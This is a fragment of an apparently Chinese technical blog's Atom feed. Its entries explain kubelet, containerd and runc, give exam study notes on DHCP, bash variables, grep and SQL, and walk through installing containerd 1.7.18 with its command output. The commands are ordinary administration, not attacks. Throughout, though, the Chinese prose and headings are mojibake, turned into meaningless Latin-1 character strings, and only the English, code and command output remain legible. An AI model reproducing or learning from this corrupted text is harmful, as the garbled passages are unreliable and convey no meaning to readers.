    <url>/2024/08/22/containerd/%E3%80%90containerd%E3%80%91(202408)%2006.kubelet%E3%80%81containerd%E3%80%81runc%E3%80%81%E5%AE%B9%E5%99%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<ul><li>Kubernetes è´Ÿè´£é›†ç¾¤ï¼ˆå¤šèŠ‚ç‚¹ï¼‰çš„è°ƒåº¦å’Œç®¡ç†ï¼Œåœ¨å•ä¸ªèŠ‚ç‚¹ï¼Œé€šè¿‡ Kubelet ç»„ä»¶é€šè¿‡ CRI GRPC æ¥å£è°ƒç”¨ Containerdã€‚</li><li>Containerd æä¾›å•ä¸ªèŠ‚ç‚¹çš„å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼ŒåŒ…æ‹¬é•œåƒã€å­˜å‚¨ã€rootfsã€ç½‘ç»œï¼Œå¯åŠ¨å®¹å™¨æ˜¯ Containerd é€šè¿‡Â <a href="https://github.com/opencontainers/runtime-spec">OCI-runtime</a>Â æ ‡å‡†è°ƒç”¨ runcã€‚</li><li>Runc å®¹å™¨å¼•å¯¼å™¨ï¼Œè´Ÿè´£æ ¹æ®ä¸€ä¸ªå®¹å™¨çš„å…·ä½“é…ç½®ï¼Œåœ¨æŒ‡å®š rootfs ä¸Šå¼•å¯¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨è¿›ç¨‹ã€‚</li></ul><p>Architecture of The CRI Plugin<br>æŸ¥çœ‹ä¸‹é¢çš„é“¾æ¥ï¼Œå¾ˆå½¢è±¡<br><a href="https://github.com/containerd/containerd/blob/v1.7.0/docs/cri/architecture.md">containerd&#x2F;docs&#x2F;cri&#x2F;architecture.md at v1.7.0 Â· containerd&#x2F;containerd Â· GitHub</a></p><p><a href="https://grpc.io/">gRPC</a><br><a href="https://doc.oschina.net/grpc">gRPC å®˜æ–¹æ–‡æ¡£ä¸­æ–‡ç‰ˆ_V1.0 (oschina.net)</a></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.rectcircle.cn/posts/containerd-1-quickstart/">Containerd è¯¦è§£ï¼ˆä¸€ï¼‰ å¿«é€Ÿå¼€å§‹ :: Rectcircle Blog</a><br><a href="https://github.com/containerd/containerd/blob/v1.7.0/docs/cri/architecture.md">containerd&#x2F;docs&#x2F;cri&#x2F;architecture.md at v1.7.0 Â· containerd&#x2F;containerd Â· GitHub</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ¯”èµ›é¢˜ç›®</title>
    <link href="/2024/08/12/%E4%BF%A1%E5%88%9B/%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/"/>
    <url>/2024/08/12/%E4%BF%A1%E5%88%9B/%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="Aå·"><a href="#Aå·" class="headerlink" title="Aå·"></a>Aå·</h2><p><strong>DHCP</strong>æœåŠ¡å™¨çš„<strong>ç§Ÿçº¦æ–‡ä»¶</strong>é€šå¸¸å­˜å‚¨åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸Šã€‚ åœ¨å¤§å¤šæ•°å¸¸è§çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œ<strong>ç§Ÿçº¦æ–‡ä»¶</strong>çš„é»˜è®¤ä½ç½®å¦‚ä¸‹ï¼š Windows Serverï¼šC:\Windows\System32*<em>dhcp</em>*. Linuxï¼ˆISCÂ <strong>DHCP</strong>æœåŠ¡å™¨ï¼‰ï¼š&#x2F;var&#x2F;lib&#x2F;dhcpd&#x2F;dhcpd.leases.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># nfs</span><br>[root@localhost ~]<span class="hljs-comment">#/usr/sbin/exportfs â€“au å…¨éƒ¨å¸è½½</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell">é¦–å…ˆè¦æ˜ç¡®<span class="hljs-variable">$</span>ç¬¦å·ç”¨åœ¨ä»€ä¹ˆåœ°æ–¹ï¼Œä½¿ç”¨åœ¨ä¸åŒçš„åœ°æ–¹ï¼Œå…¶æ‰€ä»£è¡¨çš„å®šä¹‰ä¹Ÿå°±ä¸åŒã€‚æ¯”å¦‚åœ¨bashé‡Œ<span class="hljs-variable">$</span>ç¬¦å·è¡¨ç¤ºå½“å‰ç”¨æˆ·ä¸ºæ™®é€šç”¨æˆ·ï¼›åœ¨bashè„šæœ¬é‡Œã€‚<span class="hljs-variable">$</span>å¼€å¤´è¡¨ç¤ºå˜é‡ã€‚<br><br>ä»¥ä¸‹æ˜¯ä¸€äº›ç‰¹æ®Šå˜é‡ï¼š<br><br><span class="hljs-number">1</span>ã€<span class="hljs-variable">$</span><span class="hljs-comment"># è¡¨ç¤ºå‚æ•°ä¸ªæ•°ã€‚</span><br><br><span class="hljs-number">2</span>ã€<span class="hljs-variable">$0</span> æ˜¯è„šæœ¬æœ¬èº«çš„åå­—ã€‚<br><br><span class="hljs-number">3</span>ã€<span class="hljs-variable">$1</span> æ˜¯ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚<br><br><span class="hljs-number">4</span>ã€<span class="hljs-variable">$2</span> æ˜¯ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚<br><br><span class="hljs-number">5</span>ã€<span class="hljs-variable">$</span><span class="hljs-selector-tag">@</span> è¡¨ç¤ºæ‰€æœ‰å‚æ•°ï¼Œå¹¶ä¸”æ‰€æœ‰å‚æ•°éƒ½æ˜¯ç‹¬ç«‹çš„ã€‚<br><br><span class="hljs-number">6</span>ã€<span class="hljs-variable">$</span><span class="hljs-variable">$</span> æ˜¯è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå·ã€‚<br><br><span class="hljs-number">7</span>ã€<span class="hljs-variable">$</span>? æ˜¯æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ï¼Œ<span class="hljs-number">0</span>è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–è¡¨ç¤ºæœ‰é”™è¯¯ã€‚<br></code></pre></td></tr></table></figure><p>é‡‘ä»“æ•°æ®åº“     åœ¨åˆ›å»ºæ•°æ®åº“æ—¶ï¼Œ_é»˜è®¤_çš„_ç«¯å£_ä¸º54321</p><p>å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRelational Database Management Systemï¼šRDBMSï¼‰</p><h2 id="Bå·-00-01-56"><a href="#Bå·-00-01-56" class="headerlink" title="Bå· 00:01:56"></a>Bå· 00:01:56</h2><p>è‹¥è¦ä¿®æ”¹1ä¸ªäº‹åŠ¡çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œåˆ™åº”åœ¨äº‹åŠ¡å¼€å§‹æ—¶æ‰§è¡Œï¼Ÿ<br>BEGIN TRANSACTION ISOLATION LEVEL repeatable read</p><p>grepå‘½ä»¤æ€»å¦‚æœå¸Œæœ›æ­£åˆ™è¡¨è¾¾å¼ä¸­ä½¿ç”¨\då­—ç¬¦ï¼Œåˆ™éœ€è¦ä½¿ç”¨å‘½ä»¤é€‰é¡¹ -P</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan kubeconfig]<span class="hljs-comment"># grep --help</span><br>Usage: grep [OPTION]... PATTERN [FILE]...<br>Search <span class="hljs-keyword">for</span> PATTERN <span class="hljs-keyword">in</span> each FILE.<br>Example: grep -i <span class="hljs-string">&#x27;hello world&#x27;</span> menu.h main.c<br><br>Pattern selection and interpretation:<br>  -E, --extended-regexp     PATTERN is an extended regular expression<br>  -F, --fixed-strings       PATTERN is a <span class="hljs-built_in">set</span> of newline-separated strings<br>  -G, --basic-regexp        PATTERN is a basic regular expression (default)<br>  -P, --perl-regexp         PATTERN is a Perl regular expression<br>  -e, --regexp=PATTERN      use PATTERN <span class="hljs-keyword">for</span> matching<br>  -f, --file=FILE           obtain PATTERN from FILE<br>  -i, --ignore-case         ignore <span class="hljs-keyword">case</span> distinctions<br>  -w, --word-regexp         force PATTERN to match only whole words<br>  -x, --line-regexp         force PATTERN to match only whole lines<br>  -z, --null-data           a data line ends <span class="hljs-keyword">in</span> 0 byte, not newline<br><br>Miscellaneous:<br>  -s, --no-messages         suppress error messages<br>  -v, --invert-match        select non-matching lines<br>  -V, --version             display version information and <span class="hljs-built_in">exit</span><br>      --<span class="hljs-built_in">help</span>                display this <span class="hljs-built_in">help</span> text and <span class="hljs-built_in">exit</span><br><br>Output control:<br>  -m, --max-count=NUM       stop after NUM selected lines<br>  -b, --byte-offset         <span class="hljs-built_in">print</span> the byte offset with output lines<br>  -n, --line-number         <span class="hljs-built_in">print</span> line number with output lines<br>      --line-buffered       flush output on every line<br>  -H, --with-filename       <span class="hljs-built_in">print</span> file name with output lines<br>  -h, --no-filename         suppress the file name prefix on output<br>      --label=LABEL         use LABEL as the standard input file name prefix<br>  -o, --only-matching       show only the part of a line matching PATTERN<br>  -q, --quiet, --silent     suppress all normal output<br>      --binary-files=TYPE   assume that binary files are TYPE;<br>                            TYPE is <span class="hljs-string">&#x27;binary&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>, or <span class="hljs-string">&#x27;without-match&#x27;</span><br>  -a, --text                equivalent to --binary-files=text<br>  -I                        equivalent to --binary-files=without-match<br>  -d, --directories=ACTION  how to handle directories;<br>                            ACTION is <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;recurse&#x27;</span>, or <span class="hljs-string">&#x27;skip&#x27;</span><br>  -D, --devices=ACTION      how to handle devices, FIFOs and sockets;<br>                            ACTION is <span class="hljs-string">&#x27;read&#x27;</span> or <span class="hljs-string">&#x27;skip&#x27;</span><br>  -r, --recursive           like --directories=recurse<br>  -R, --dereference-recursive  likewise, but follow all symlinks<br>      --include=FILE_PATTERN  search only files that match FILE_PATTERN<br>      --exclude=FILE_PATTERN  skip files and directories matching FILE_PATTERN<br>      --exclude-from=FILE   skip files matching any file pattern from FILE<br>      --exclude-dir=PATTERN  directories that match PATTERN will be skipped.<br>  -L, --files-without-match  <span class="hljs-built_in">print</span> only names of FILEs with no selected lines<br>  -l, --files-with-matches  <span class="hljs-built_in">print</span> only names of FILEs with selected lines<br>  -c, --count               <span class="hljs-built_in">print</span> only a count of selected lines per FILE<br>  -T, --initial-tab         make tabs line up (<span class="hljs-keyword">if</span> needed)<br>  -Z, --null                <span class="hljs-built_in">print</span> 0 byte after FILE name<br></code></pre></td></tr></table></figure><p>SQLè¯­è¨€å…±åˆ†ä¸ºå››å¤§ç±»ï¼šæ•°æ®å®šä¹‰è¯­è¨€DDLï¼Œæ•°æ®æ“çºµè¯­è¨€DMLï¼Œæ•°æ®æŸ¥è¯¢è¯­è¨€DQLï¼Œæ•°æ®æ§åˆ¶è¯­è¨€DCLã€‚ </p><ol><li>æ•°æ®å®šä¹‰è¯­è¨€DDL</li></ol><p> æ•°æ®å®šä¹‰è¯­è¨€DDLç”¨æ¥åˆ›å»ºæ•°æ®åº“ä¸­çš„å„ç§å¯¹è±¡â€”â€“è¡¨ã€è§†å›¾ã€ç´¢å¼•ã€åŒä¹‰è¯ã€èšç°‡ç­‰å¦‚ï¼š </p><p> CREATE TABLE&#x2F;VIEW&#x2F;INDEX&#x2F;SYN&#x2F;CLUSTER </p><p> DDLæ“ä½œæ˜¯éšæ€§æäº¤çš„ï¼ä¸èƒ½rollback </p><p> 2 .æ•°æ®æ“çºµè¯­è¨€DML </p><p> æ•°æ®æ“çºµè¯­è¨€DMLä¸»è¦æœ‰ä¸‰ç§å½¢å¼ï¼š </p><ol><li><p>æ’å…¥ï¼šINSERT </p></li><li><p>æ›´æ–°ï¼šUPDATE </p></li><li><p>åˆ é™¤ï¼šDELETE</p></li></ol><ol start="3"><li>æ•°æ®æŸ¥è¯¢è¯­è¨€DQL</li></ol><p> æ•°æ®æŸ¥è¯¢è¯­è¨€DQLåŸºæœ¬ç»“æ„æ˜¯ç”±SELECTå­å¥ï¼ŒFROMå­å¥ï¼ŒWHEREå­å¥ç»„æˆçš„æŸ¥è¯¢å—ï¼š </p><p> SELECT &lt;å­—æ®µåè¡¨&gt; </p><p> FROM &lt;è¡¨æˆ–è§†å›¾å&gt; </p><p> WHERE &lt;æŸ¥è¯¢æ¡ä»¶&gt; </p><ol start="4"><li>æ•°æ®æ§åˆ¶è¯­è¨€DCL</li></ol><p> æ•°æ®æ§åˆ¶è¯­è¨€DCLç”¨æ¥æˆäºˆæˆ–å›æ”¶è®¿é—®æ•°æ®åº“çš„æŸç§ç‰¹æƒï¼Œå¹¶æ§åˆ¶æ•°æ®åº“æ“çºµäº‹åŠ¡å‘ç”Ÿçš„æ—¶é—´åŠæ•ˆæœï¼Œå¯¹æ•°æ®åº“å®è¡Œç›‘è§†ç­‰ã€‚å¦‚ï¼š </p><ol><li><p>GRANTï¼šæˆæƒã€‚ </p></li><li><p>ROLLBACK [WORK] TO [SAVEPOINT]ï¼šå›é€€åˆ°æŸä¸€ç‚¹ã€‚</p></li></ol><p> å›æ»šâ€”ROLLBACK </p><p> å›æ»šå‘½ä»¤ä½¿æ•°æ®åº“çŠ¶æ€å›åˆ°ä¸Šæ¬¡æœ€åæäº¤çš„çŠ¶æ€ã€‚å…¶æ ¼å¼ä¸ºï¼š </p><p> SQL&gt;ROLLBACK  </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€containerdã€‘(202407) 01.å®‰è£…containerd</title>
    <link href="/2024/07/29/containerd/%E3%80%90containerd%E3%80%91(202407)%2001.%E5%AE%89%E8%A3%85containerd/"/>
    <url>/2024/07/29/containerd/%E3%80%90containerd%E3%80%91(202407)%2001.%E5%AE%89%E8%A3%85containerd/</url>
    
    <content type="html"><![CDATA[<h1 id="å®‰è£…containerd"><a href="#å®‰è£…containerd" class="headerlink" title="å®‰è£…containerd"></a>å®‰è£…containerd</h1><h2 id="ç¯å¢ƒä¿¡æ¯"><a href="#ç¯å¢ƒä¿¡æ¯" class="headerlink" title="ç¯å¢ƒä¿¡æ¯"></a>ç¯å¢ƒä¿¡æ¯</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 6.5.0-41-generic <span class="hljs-comment">#41~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Mon Jun  3 11:32:55 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><h2 id="ä¸‹è½½å®‰è£…containerd"><a href="#ä¸‹è½½å®‰è£…containerd" class="headerlink" title="ä¸‹è½½å®‰è£…containerd"></a>ä¸‹è½½å®‰è£…containerd</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># wget https://github.com/containerd/containerd/releases/download/v1.7.18/cri-containerd-cni-1.7.18-linux-amd64.tar.gz</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># tar -xvf cri-containerd-cni-1.7.18-linux-amd64.tar.gz -C /</span><br>cri-containerd.DEPRECATED.txt<br>etc/<br>etc/systemd/<br>etc/systemd/system/<br>etc/systemd/system/containerd.service<br>etc/cni/<br>etc/cni/net.d/<br>etc/cni/net.d/10-containerd-net.conflist<br>etc/crictl.yaml<br>usr/<br>usr/local/<br>usr/local/sbin/<br>usr/local/sbin/runc<br>usr/local/bin/<br>usr/local/bin/containerd-shim<br>usr/local/bin/crictl<br>usr/local/bin/containerd-stress<br>usr/local/bin/critest<br>usr/local/bin/ctr<br>usr/local/bin/ctd-decoder<br>usr/local/bin/containerd-shim-runc-v2<br>usr/local/bin/containerd-shim-runc-v1<br>usr/local/bin/containerd<br>opt/<br>opt/cni/<br>opt/cni/bin/<br>opt/cni/bin/tuning<br>opt/cni/bin/firewall<br>opt/cni/bin/loopback<br>opt/cni/bin/macvlan<br>opt/cni/bin/ptp<br>opt/cni/bin/bridge<br>opt/cni/bin/static<br>opt/cni/bin/dhcp<br>opt/cni/bin/dummy<br>opt/cni/bin/sbr<br>opt/cni/bin/vrf<br>opt/cni/bin/host-local<br>opt/cni/bin/bandwidth<br>opt/cni/bin/vlan<br>opt/cni/bin/host-device<br>opt/cni/bin/portmap<br>opt/cni/bin/ipvlan<br>opt/containerd/<br>opt/containerd/cluster/<br>opt/containerd/cluster/version<br>opt/containerd/cluster/gce/<br>opt/containerd/cluster/gce/configure.sh<br>opt/containerd/cluster/gce/env<br>opt/containerd/cluster/gce/cloud-init/<br>opt/containerd/cluster/gce/cloud-init/master.yaml<br>opt/containerd/cluster/gce/cloud-init/node.yaml<br>opt/containerd/cluster/gce/cni.template<br><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># mkdir -p /etc/containerd</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># containerd config default &gt; /etc/containerd/config.toml</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># systemctl start containerd</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># systemctl enable containerd</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># systemctl status containerd</span><br>â— containerd.service - containerd container runtime<br>     Loaded: loaded (/etc/systemd/system/containerd.service; enabled; vendor preset: enabled)<br>     Active: active (running) since Mon 2024-07-08 20:41:42 CST; 8s ago<br>       Docs: https://containerd.io<br>   Main PID: 36771 (containerd)<br>      Tasks: 8<br>     Memory: 9.2M<br>        CPU: 89ms<br>     CGroup: /system.slice/containerd.service<br>             â””â”€36771 /usr/local/bin/containerd<br><br>7æœˆ 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.765403283+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start subscribing containerd event&quot;</span><br>7æœˆ 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.765841560+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start recovering state&quot;</span><br>7æœˆ 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.765436975+08:00&quot;</span> level=info msg=serving... address=/run/containerd/containerd.sock.ttrpc<br>7æœˆ 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.766984892+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start event monitor&quot;</span><br>7æœˆ 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.767354311+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start snapshots syncer&quot;</span><br>7æœˆ 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.767367946+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start cni network conf syncer for default&quot;</span><br>7æœˆ 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.767378325+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start streaming server&quot;</span><br>7æœˆ 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.767648701+08:00&quot;</span> level=info msg=serving... address=/run/containerd/containerd.sock<br>7æœˆ 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.767846800+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;containerd successfully booted in 0.046182s&quot;</span><br>7æœˆ 08 20:41:42 ubuntu-22 systemd[1]: Started containerd container runtime.<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹çŠ¶æ€"><a href="#æŸ¥çœ‹çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹çŠ¶æ€"></a>æŸ¥çœ‹çŠ¶æ€</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[root@ubuntu-22 ~]<span class="hljs-comment"># ctr version</span><br>Client:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  Go version: go1.21.11<br><br>Server:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  UUID: 64bd2d8f-d225-40aa-82fd-874a0a06032b<br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹é»˜è®¤é…ç½®"><a href="#æŸ¥çœ‹é»˜è®¤é…ç½®" class="headerlink" title="æŸ¥çœ‹é»˜è®¤é…ç½®"></a>æŸ¥çœ‹é»˜è®¤é…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span 